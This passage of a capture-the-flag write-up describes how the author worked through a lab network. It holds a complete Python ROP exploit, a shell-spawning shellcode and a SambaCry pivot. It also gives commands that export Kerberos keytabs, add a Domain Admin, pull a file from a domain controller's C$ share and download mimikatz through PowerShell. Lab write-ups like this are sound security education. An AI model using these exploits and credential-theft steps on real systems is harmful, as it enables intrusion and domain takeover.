custom <code class="language-plaintext highlighter-rouge">sendstring</code> function, which uses <code class="language-plaintext highlighter-rouge">strlen</code> to determine the length of the buffer to be sent.</ul></ul><p>From the above observation, I came up with the following plans to exploit the binary:</p><ol><li>Take advantage of the input being echoed back to the client to leak addresses on the stack to bypass ASLR and then overwrite rip with a ROP chain to <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>. I wanted to leak the address of <code class="language-plaintext highlighter-rouge">__libc_start_main+234</code> so that I could calculate the base address of libc. However, this did not work (or it’s just me haven’t figure out if this is possible) for the following reasons:<ul><li>The buffer was sent using the <code class="language-plaintext highlighter-rouge">sendstring</code> custom function, which uses <code class="language-plaintext highlighter-rouge">strlen</code> to determine the buffer length. It will stop when it hits a NULL byte.<li>The <code class="language-plaintext highlighter-rouge">fd</code> local variable is before the address that I needed to leak, and it takes up 4 bytes. However, the actual correct <code class="language-plaintext highlighter-rouge">fd</code> does not take up this many bytes so there will be NULL bytes before the address we need to leak. If I overwrite the <code class="language-plaintext highlighter-rouge">fd</code> to some incorrect value to bypass <code class="language-plaintext highlighter-rouge">strlen</code>, the output will not be sent back to the client.</ul><li>At this moment, I realized that the main function attempts to close the client fd before it returns. In this approach, I overflow the buffer to overwrite the fd with wrong values so the socket is not closed when the main function returns, and <strong>THEN</strong> control rip to read in my shellcode and execute it. In this way, I did not have to guess the stack address and still achieve a partially arbitrary write.</ol><p>I used ROP to make the program read my shellcode in. However, there were 2 problems that I needed to solve before I can write the exploit:</p><ol><li>Identify the version of the libc being used since it was not given. I first tried to locate glibc on my Kali machine, which was in <code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu/</code>. However, I did not find it on the remote machine and did not know why. I played a little bit more with the program on the remote host and figure out the <code class="language-plaintext highlighter-rouge">/home</code> directory contains the user <code class="language-plaintext highlighter-rouge">ec2-user</code>. <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/31.PNG" alt="lister-5" /> Having worked with the Linux-AMI of AWS EC2 before, I immediately knew that this was running on a RHEL machine in oppose to my Debian machine. I setup an EC2 instance myself and study the filesystem. Turned out that it was in <code class="language-plaintext highlighter-rouge">/lib64</code> <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/32.PNG" alt="lister-6" /><li>Identify the base address of libc. Having worked with Linux for a while, I knew that the memory mapping of a process is stored in <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/maps</code>. However, it is not possible to read file using the program. It can only list files in a directory. I played around with the <code class="language-plaintext highlighter-rouge">/proc</code> directory and found out that the directory <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/map_files</code> also contains parts of the information in the maps file. As you can see later in the asciinema record, there are filenames that are address ranges. They are indeed symlinks to the actual libc and from there, I was able to identify the base address of libc</ol><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/39.PNG" alt="lister-7" /></p><p>But how did I figure out the PID of the process? With the assumption that most of the time, newly spawned processes on the remote machine are only the children of the <code class="language-plaintext highlighter-rouge">lister</code> process, I took the following steps to get the PID of a child process:</p><ul><li>Connect to the service to create a process. Read the <code class="language-plaintext highlighter-rouge">/proc</code> directory<li>Connect to the service the second time to create a new process. Read the <code class="language-plaintext highlighter-rouge">/proc</code> directory again<li>The difference between the 2 output is the PID of the newly created process the second time we connect to the service.</ul><p>From this point on, I had all the necessary information to write the exploit. The code below has comments to help you understand it.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">string</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.123.15.53</span><span class="sh">"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">12345</span>
<span class="c1">#HOST = "localhost"
#PORT = 1234
</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc-2.17.so</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x7fd9dcd83000</span>

<span class="n">gadgets</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">binsh</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rdi</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x22298</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc0065</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rax</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1d150</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rsi</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x21738</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rdx</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1b92</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">xor_rax_rax</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8906f</span>
<span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">push_rax</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa5e8</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ERROR</span><span class="sh">'</span>


<span class="k">def</span> <span class="nf">getDir</span><span class="p">(</span><span class="n">dirToList</span><span class="p">):</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">Getting {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">dirToList</span><span class="p">)</span>
    <span class="n">M</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span> <span class="c1"># Pad the path with additional characters because of the glitch
</span>        <span class="k">try</span><span class="p">:</span>
            <span class="n">s</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">{}/</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">dirToList</span><span class="p">)</span>
            <span class="n">s</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">m</span> <span class="o">=</span> <span class="sh">""</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                    <span class="n">m</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">Directory does not exist</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">m</span><span class="p">:</span>
                <span class="n">M</span> <span class="o">=</span> <span class="n">m</span>
                <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">M</span>

<span class="k">def</span> <span class="nf">getProcesses</span><span class="p">():</span>
    <span class="n">m</span> <span class="o">=</span> <span class="nf">getDir</span><span class="p">(</span><span class="sh">"</span><span class="s">/proc</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m</span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">any</span><span class="p">(</span><span class="n">e</span> <span class="ow">in</span> <span class="n">x</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">))]</span>
    <span class="k">return</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">getMapFiles</span><span class="p">(</span><span class="n">pid</span><span class="p">):</span>
    <span class="n">m</span> <span class="o">=</span> <span class="nf">getDir</span><span class="p">(</span><span class="sh">"</span><span class="s">/proc/{}/map_files</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">createHang</span><span class="p">():</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">s</span>

<span class="k">def</span> <span class="nf">setRDI</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rdi</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setRAX</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rax</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setRSI</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rsi</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setRDX</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">pop_rdx</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">readBuf</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">skipfd</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">setRAX</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">skipfd</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="nf">setRDI</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">setRSI</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">setRDX</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># Get pid of the program
</span>    <span class="n">p</span> <span class="o">=</span> <span class="nf">getProcesses</span><span class="p">()</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">createHang</span><span class="p">()</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="nf">getProcesses</span><span class="p">()</span>
    <span class="n">diff</span> <span class="o">=</span> <span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">p1</span> <span class="k">if</span> <span class="n">x</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">p</span><span class="p">]</span>
    <span class="k">print</span> <span class="n">diff</span>
    <span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
        <span class="n">m</span> <span class="o">=</span> <span class="nf">getMapFiles</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
        <span class="k">print</span> <span class="n">m</span>

    <span class="c1"># After obtaining the libc base address, calculate all the gadget addresses
</span>    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">gadgets</span><span class="p">.</span><span class="nf">keys</span><span class="p">():</span>
        <span class="n">gadgets</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">+=</span> <span class="n">libc_base</span>
        <span class="k">print</span> <span class="n">k</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">gadgets</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
    
    <span class="c1"># Building shellcode
</span>    <span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">flag.txt</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">shellcode.asm</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">())</span>

    <span class="c1"># Trigger the overflow
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">320</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1"># rbp
</span>    <span class="c1"># ROP chain to read shellcode to a RWX memory segment
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">readBuf</span><span class="p">(</span><span class="mh">0x601000</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># read file name
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x601000</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>

    <span class="k">print</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># The length must not exceed 0x200
</span>    <span class="n">s</span> <span class="o">=</span> <span class="nf">createHang</span><span class="p">()</span>
    <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

    <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Shellcode:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="nf">nop</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
<span class="c1">; Open file</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mh">0x601000</span>
<span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
<span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
<span class="nf">syscall</span>
<span class="c1">; Read file</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
<span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x601c00</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">40</span>
<span class="nf">syscall</span>
<span class="c1">; Write buffer to client fd</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mi">4</span>
<span class="nf">syscall</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/34.PNG" alt="lister" /></p><p>The flag is <code class="language-plaintext highlighter-rouge">GRIMM-STACK-OVERFLOWD</code></p><h2 id="secondary-control-300pts">Secondary Control (300pts)</h2><p>With the provided description (“The Administrator may CRY if you get further into their network”) I was certain that the exploit gotta be the famous MS17-010 from WannaCry. From the nmap scan before and with a little bit of DNS enumeration, I figured out that there are 2 Domain Controllers on the network. The primary DC at <code class="language-plaintext highlighter-rouge">10.123.15.10</code> is a Windows Server 2016 machine, while the secondary DC at <code class="language-plaintext highlighter-rouge">10.123.15.20</code> is unknown. At this point, I have not obtained a shell on the lister machine yet and only tried to enumerate the network more and more from the gitlab-runner machine. However, the exploit did not work against the primary DC.</p><p>It took me quite a long time to decide to move on to obtaining a shell on the lister machine and this is one of the mistake that I’ve made. I should have done this earlier because later on, to progress, I needed to pivot through the lister machine. Using the same exploit from the previous level and modify the shellcode, I was able to obtain a shell through the existing connection with the binary. Here is the shellcode with descriptive comments:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nf">nop</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
<span class="c1">; dup2(stdin, 4) since 4 is the client fd.</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">33</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mi">4</span>
<span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
<span class="nf">syscall</span>
<span class="c1">; dup2(stdout, 4)</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">33</span>
<span class="nf">inc</span> <span class="nb">rsi</span>
<span class="nf">syscall</span>
<span class="c1">; dup2(stderr, 4)</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">33</span>
<span class="nf">inc</span> <span class="nb">rsi</span>
<span class="nf">syscall</span>
<span class="c1">; execve("/bin/sh", 0, 0). From the exploit, a "/bin/sh" string was placed at 0x601000</span>
<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">59</span>
<span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rdx</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mh">0x601000</span>
<span class="nf">syscall</span>
<span class="c1">; After the syscall, stdin, stdout and stderr was redirected to our client fd and we are interacting with /bin/sh on the remote machine now</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
<span class="nf">nop</span>
</pre></table></code></div></div><p>I again used an SSH-tunnel to forward <code class="language-plaintext highlighter-rouge">10.123.15.53:12345</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1:1234</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh -D 1337 -i grimmKey gitlab-runner@10.123.14.12
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/33.PNG" alt="DC2-0" /></p><p>After obtaining this basic shell, I again upgraded it to a meterpreter shell so that I can manage them all in metasploit from one of my EC2 instance.</p><p>At the same moment I realized that there is not only one exploit that has <em>CRY</em> in its name. There was also <strong>SambaCRY</strong>. I then proceeded to use Metasploit’s autoroute to pivot through the meterpreter session on the lister machine and scan the networks for open 445 port. And BOOOM! The secondary DC is now visible through pivoting:</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/18.PNG" alt="DC2-1" /></p><p>Metasploit actually has a module to exploit SambaCry <a href="https://www.rapid7.com/db/modules/exploit/linux/samba/is_known_pipename">here</a>. Running the exploit against the secondary DC at <code class="language-plaintext highlighter-rouge">10.123.15.20</code> gave me a shell.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/19.PNG" alt="DC2-1" /></p><p>The flag is in <code class="language-plaintext highlighter-rouge">/root</code> and is <code class="language-plaintext highlighter-rouge">GRIMM-I-SAMBA-CRY-EVERY-TIME</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/20.PNG" alt="DC2-1" /></p><p>As always, I upgraded this shell to a meterpreter shell for easy management.</p><h2 id="prime-location-400pts">Prime Location (400pts)</h2><p>After got onto the secondary DC, I still did not understand how a Linux machine could be a Domain Controller. Turned out that it can be done using samba. I started to do enumeration on the localhost and found some interesting stuffs.</p><ul><li>Samba was connecting to the primary DC <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/21.PNG" alt="DC1-1" /><li>Where samba was running from <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/22.PNG" alt="DC1-2" /><li>Samba configuration files and some data <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/23.PNG" alt="DC1-3" /></ul><p>Although these are interesting information, for example the secrets files that contains encrypted credentials or the Kerberos keytab, I did not use these to gain access to the primary DC. However, I did came across many new things during investigating these information. For example, I was able to obtain the hash</p><p>While I tried using Kerberos utils like in <a href="https://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html">this</a> blog post, I noticed that samba-tool was there but I didn’t use it. Further more, I looked at the bash history and realized that I really should have tried it earlier.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/24.PNG" alt="DC1-4" /></p><p>I guess maybe this was just a hint, and I tried the same thing: create a new user and add it to the Domain Admins group. And now I am a Domain Admin!</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/25.PNG" alt="DC1-5" /></p><p>There is another way to get the flag that I would also like to show you in this writeup, which uses <code class="language-plaintext highlighter-rouge">smb-client</code> to access the shares on the primary DC:</p><ul><li><p>Use <code class="language-plaintext highlighter-rouge">samba-tool</code> to export the keytab from the primary DC</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  /usr/local/samba/bin/samba-tool domain exportkeytab /tmp/test.keytab
</pre></table></code></div></div><li><p>Init a new Kerberos ticket for <code class="language-plaintext highlighter-rouge">smb-client</code> on DC2</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>  kinit -k -t /tmp/test.keytab CEO@CORP.HAX
</pre></table></code></div></div><li><p>Use <code class="language-plaintext highlighter-rouge">smb-client</code> with the generated ticket</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  smbclient -k //dc1.corp.hax/C\$/ -c ls
  smbclient -k //dc1.corp.hax/C\$/ -c "get Users\\Administrator\\flag.txt /tmp/flag.txt"
</pre></table></code></div></div></ul><p>And the flag is <code class="language-plaintext highlighter-rouge">GRIMM-DOMAIN-ADMIN-BEST-ADMIN</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/26.PNG" alt="DC1-6" /></p><h2 id="forgotten-password-400pts">Forgotten Password (400pts)</h2><p>This level is a little bit tricky if you did not get it quickly. From the description, I assumed that I needed to use mimikatz to retrieve that password of the <code class="language-plaintext highlighter-rouge">CEO</code> user. I tried to use Internet Explorer to download mimikatz but it didn’t allow me to save the file so I used this following Powershell script to download it:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.SecurityProtocolType</span><span class="p">]::</span><span class="n">Tls12</span><span class="w">
</span><span class="nv">$WebClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
</span><span class="nv">$WebClient</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s2">"https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180502/mimikatz_trunk.zip"</span><span class="p">,</span><span class="s2">"C:\Users\fpasswd1\Desktop\meme.zip"</span><span class="p">)</span><span class="w">
